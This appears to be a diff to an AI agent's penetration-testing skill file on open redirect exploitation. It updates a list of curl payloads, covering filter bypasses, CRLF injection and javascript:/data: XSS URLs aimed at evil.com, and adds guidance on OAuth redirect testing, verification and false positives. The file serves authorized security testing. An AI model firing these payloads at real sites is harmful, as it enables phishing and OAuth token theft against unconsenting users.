@@ -2,7 +2,7 @@
 name: attack-open-redirect
 description: "Open redirect exploitation — URL parameter manipulation, OAuth token theft, phishing chains"
 category: "web-application"
-version: "1.0"
+version: "1.1.0"
 author: "cyberstrike-official"
 tags:
   - open-redirect
@@ -43,44 +43,44 @@ callback, path, out, view, login_url, image_url, go, link, ref
 
 ```bash
 # Direct redirect
-curl -s -D- "https://TARGET/redirect?url=https://evil.com"
+curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=https://evil.com"
 
 # Protocol-relative
-curl -s -D- "https://TARGET/redirect?url=//evil.com"
+curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=//evil.com"
 
 # Encoded
-curl -s -D- "https://TARGET/redirect?url=https%3A%2F%2Fevil.com"
+curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=https%3A%2F%2Fevil.com"
 
 # Backslash bypass
-curl -s -D- "https://TARGET/redirect?url=https://evil.com\@TARGET"
+curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=https://evil.com\@TARGET"
 
 # At-sign bypass
-curl -s -D- "https://TARGET/redirect?url=https://TARGET@evil.com"
+curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=https://TARGET@evil.com"
 ```
 
 ### Phase 3: Filter Bypass
 
 ```bash
 # Subdomain matching
-curl -s -D- "https://TARGET/redirect?url=https://TARGET.evil.com"
+curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=https://TARGET.evil.com"
 
 # URL encoding tricks
-curl -s -D- "https://TARGET/redirect?url=https://evil.com%23.TARGET"
+curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=https://evil.com%23.TARGET"
 
 # Double encoding
-curl -s -D- "https://TARGET/redirect?url=https://%65%76%69%6c.com"
+curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=https://%65%76%69%6c.com"
 
 # Null byte
-curl -s -D- "https://TARGET/redirect?url=https://evil.com%00.TARGET"
+curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=https://evil.com%00.TARGET"
 
 # CRLF + Location header
-curl -s -D- "https://TARGET/redirect?url=%0d%0aLocation:%20https://evil.com"
+curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=%0d%0aLocation:%20https://evil.com"
 
 # JavaScript scheme
-curl -s -D- "https://TARGET/redirect?url=javascript:alert(document.domain)"
+curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=javascript:alert(document.domain)"
 
 # Data URI
-curl -s -D- "https://TARGET/redirect?url=data:text/html,<script>alert(1)</script>"
+curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=data:text/html,<script>alert(1)</script>"
 ```
 
 ### Phase 4: OAuth Token Theft
@@ -122,6 +122,25 @@ If redirect_uri accepts attacker domain, the OAuth code/token is sent to the att
 
 - `attack_script oauth_tester` — OAuth redirect_uri bypass testing
 - `curl` — manual redirect testing
+
+## OAuth and Redirect-Chain Validation
+
+Prioritize redirect parameters used in login, logout, OAuth/OIDC callback, invite, and password-reset flows. Check common parameter variants (`next`, `return`, `returnTo`, `continue`, `redirect`, `redirect_uri`, `url`) and observe the actual `Location` header or browser navigation.
+
+- Test allowlist parsing with one harmless external destination you control. Verify normalization, URL parsing, scheme-relative URLs, encoded delimiters, and host suffix handling separately; do not assume a reflected parameter causes a redirect.
+- For OAuth/OIDC, use a test client and test account. Confirm whether an authorization code or token is actually delivered to an untrusted destination before claiming token theft or account takeover. A redirect on the same trusted domain is not automatically a bypass.
+- Separate phishing/open-redirect impact from server-side fetching. Only test SSRF escalation if the application fetches the destination itself and that behavior is within scope.
+- Record the original URL, exact parameter, response `Location`, final destination, and whether any sensitive value was actually exposed. Redact codes, tokens, and session values.
+
+## Verification and False Positives
+
+- Confirm that the application redirects to an attacker-controlled destination after parsing the supplied input. A URL parameter that is ignored or safely normalized is not a finding.
+- Use a domain you control for testing and do not collect OAuth codes, access tokens, or other users' data. For OAuth-related chains, prove the token/authorization impact using a test account and a safe callback.
+- Check relative URLs, scheme-relative URLs, encoded delimiters, and allowlist parsing one at a time. A redirect to an allowlisted domain or a URL displayed in text is not an open redirect.
+- Severity depends on the trust boundary and demonstrated chain. A standalone redirect is not automatically account takeover or token theft.
+- Preserve the original URL, the exact redirect parameter, the `Location` response, and the final destination. Redact sensitive query values.
+- [uphiago/recon-skills — open-redirect hunting](https://github.com/uphiago/recon-skills/blob/main/redteam/hunt-open-redirect/SKILL.md) (external research reference; not a local Cyber Strike skill path).
+- [elementalsouls/Claude-BugHunter — open-redirect hunting](https://github.com/elementalsouls/Claude-BugHunter/blob/main/skills/hunt-open-redirect/SKILL.md) (external research reference; not a local Cyber Strike skill path).
 
 ## References
 
